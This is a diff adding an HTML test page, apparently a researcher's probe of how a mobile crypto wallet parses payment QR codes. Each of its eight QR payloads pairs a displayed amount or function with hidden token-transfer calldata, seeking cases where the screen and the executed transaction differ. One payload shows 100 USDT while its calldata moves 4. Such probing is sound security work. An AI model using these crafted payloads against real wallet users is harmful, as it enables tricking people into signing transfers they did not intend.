@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TW Attack v9 — Static QR Tests</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0f0f1a;color:#e0e0f0;padding:20px;max-width:900px;margin:0 auto}
+h1{font-size:20px;color:#f0f0ff;margin-bottom:4px}
+.sub{color:#8888bb;font-size:13px;margin-bottom:16px}
+.alert{background:#2a1a1a;color:#dd8888;border-left:3px solid #aa4444;font-size:12px;padding:8px 12px;border-radius:4px;margin-bottom:16px}
+.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+@media(max-width:650px){.grid{grid-template-columns:1fr}}
+.cell{background:#1a1a2e;border:1px solid #2a2a3a;border-radius:10px;padding:12px;text-align:center}
+.letter{font-size:28px;font-weight:bold;color:#bbbbff}
+.label{font-size:10px;color:#8888bb;margin-bottom:6px}
+.qr{width:160px;height:160px;border:2px solid #2a2a3a;border-radius:8px;background:#fff;padding:4px;margin:4px 0}
+.uri{font-size:8px;color:#aaccff;word-break:break-all;background:#0a0a15;padding:4px;border-radius:4px;margin:4px 0;font-family:monospace;text-align:left;max-height:60px;overflow:hidden}
+.pred{font-size:10px;color:#88dd88;padding:4px 6px;background:#1a2a1a;border-radius:4px;margin-top:4px;text-align:left}
+.result{width:100%;padding:6px;border-radius:4px;border:1px solid #3a3a5a;background:#0a0a15;color:#e0e0f0;font-size:11px;margin-top:4px;font-family:inherit;height:36px}
+</style>
+</head>
+<body>
+
+<h1>🔬 v9 — Static QR Tests (Zero JS)</h1>
+<p class="sub">Built-in camera (top-right). No JavaScript — pure HTML. QR via api.qrserver.com.</p>
+
+<div class="alert">
+<strong>⚡ Key finding (v7/B):</strong> Adding <code>data</code> to a <code>/transfer?address=&amp;uint256=</code> URI makes the wallet show <strong>ETH not USDT</strong> — proving <code>data</code> genuinely breaks erc20_transfer routing! These tests probe what it falls back to.
+</div>
+
+<!-- ============================================================ -->
+<!-- TEST A -->
+<!-- ============================================================ -->
+<div class="grid">
+
+<div class="cell">
+  <div class="letter">A</div>
+  <div class="label">value=0.00001 ETH in WEI (integer)</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%3Fvalue%3D10000000000000%26data%3D0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900" alt="QR A" loading="lazy">
+  <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1?value=10000000000000&data=0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900</div>
+  <div class="pred">🎯 Shows 0.00001 ETH? Confirm enabled? Data passes? (value in wei as integer may be parsed differently)</div>
+  <input class="result" placeholder="Screen shows? Confirmable?" id="rA">
+</div>
+
+<!-- ============================================================ -->
+<!-- TEST B -->
+<!-- ============================================================ -->
+<div class="cell">
+  <div class="letter">B</div>
+  <div class="label">value=0.1 ETH in WEI</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%3Fvalue%3D100000000000000000%26data%3D0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900" alt="QR B" loading="lazy">
+  <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1?value=100000000000000000&data=0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900</div>
+  <div class="pred">🎯 Shows 0.1 ETH? If confirmable, tests if USDT contract receiving ETH causes revert of data</div>
+  <input class="result" placeholder="Screen shows? Confirmable? Result?" id="rB">
+</div>
+
+<!-- ============================================================ -->
+<!-- TEST C -->
+<!-- ============================================================ -->
+<div class="cell">
+  <div class="letter">C</div>
+  <div class="label">/transfer with data FIRST, then params</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Fdata%3D0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900%26address%3D0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266%26uint256%3D1000000" alt="QR C" loading="lazy">
+  <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?data=0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900&address=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&uint256=1000000</div>
+  <div class="pred">🎯 data BEFORE params → parser might see data first → fail erc20_transfer build → fall to generic → data passes!</div>
+  <input class="result" placeholder="Screen shows? Confirmable?" id="rC">
+</div>
+
+<!-- ============================================================ -->
+<!-- TEST D -->
+<!-- ============================================================ -->
+<div class="cell">
+  <div class="letter">D</div>
+  <div class="label">/transfer + params + data, uint256=0</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266%26uint256%3D0%26data%3D0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900" alt="QR D" loading="lazy">
+  <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&uint256=0&data=0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900</div>
+  <div class="pred">🎯 uint256=0 → shows 0 USDT. Still erc20_transfer? Or falls to generic? Data should pass either way.</div>
+  <input class="result" placeholder="Screen shows? Confirmable?" id="rD">
+</div>
+
+<!-- ============================================================ -->
+<!-- TEST E -->
+<!-- ============================================================ -->
+<div class="cell">
+  <div class="letter">E</div>
+  <div class="label">/approve (different function) + data</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Fapprove%3Faddress%3D0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266%26uint256%3D0%26data%3D0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900" alt="QR E" loading="lazy">
+  <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/approve?address=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&uint256=0&data=0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900</div>
+  <div class="pred">🎯 /approve is NOT handled by erc20_transfer → MUST route to contract_generic → data passes through. Shows generic 0 ETH interaction.</div>
+  <input class="result" placeholder="Screen shows? Confirmable?" id="rE">
+</div>
+
+<!-- ============================================================ -->
+<!-- TEST F -->
+<!-- ============================================================ -->
+<div class="cell">
+  <div class="letter">F</div>
+  <div class="label">trust:// + asset + address + data (no amount)</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=trust%3A%2F%2Fsend%3Fasset%3D0xdAC17F958D2ee523a2206206994597C13D831ec7%26address%3D0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266%26data%3D0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900" alt="QR F" loading="lazy">
+  <div class="uri">trust://send?asset=0xdAC17F958D2ee523a2206206994597C13D831ec7&address=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&data=0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900</div>
+  <div class="pred">🎯 Camera path → may show token picker (previous v6/D showed empty fields). Retesting with camera.</div>
+  <input class="result" placeholder="Screen shows?" id="rF">
+</div>
+
+<!-- ============================================================ -->
+<!-- TEST G -->
+<!-- ============================================================ -->
+<div class="cell">
+  <div class="letter">G</div>
+  <div class="label">No /transfer, uint256=4000000 + data</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%3Fuint256%3D4000000%26data%3D0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900" alt="QR G" loading="lazy">
+  <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1?uint256=4000000&data=0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900</div>
+  <div class="pred">🎯 No /transfer → no erc20_transfer. uint256 treated as generic param. Contract_generic with data passing through. Might show nothing or amount.</div>
+  <input class="result" placeholder="Screen shows?" id="rG">
+</div>
+
+<!-- ============================================================ -->
+<!-- TEST H -->
+<!-- ============================================================ -->
+<div class="cell">
+  <div class="letter">H</div>
+  <div class="label">/transfer + uint256=100000000 (100 USDT) + data</div>
+  <img class="qr" src="https://api.qrserver.com/v1/create-qr-code/?size=160x160&data=ethereum%3A0xdAC17F958D2ee523a2206206994597C13D831ec7%401%2Ftransfer%3Faddress%3D0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266%26uint256%3D100000000%26data%3D0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900" alt="QR H" loading="lazy">
+  <div class="uri">ethereum:0xdAC17F958D2ee523a2206206994597C13D831ec7@1/transfer?address=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266&uint256=100000000&data=0xa9059cbb000000000000000000000000f39fd6e51aad88f6f4ce6ab8827279cfffb9226600000000000000000000000000000000000000000000000000000000003d0900</div>
+  <div class="pred">🎯 KEY TEST: Shows 100 USDT (uint256=100000000), data has 4 USDT. If data breaks erc20_transfer → 4 executes (mismatch!). If erc20 survives → 100 executes (honest). Two outcomes, both teach us.</div>
+  <input class="result" placeholder="Shows 100 USDT or ETH? What executes?" id="rH">
+</div>
+
+</div>
+
+</body>
+</html>
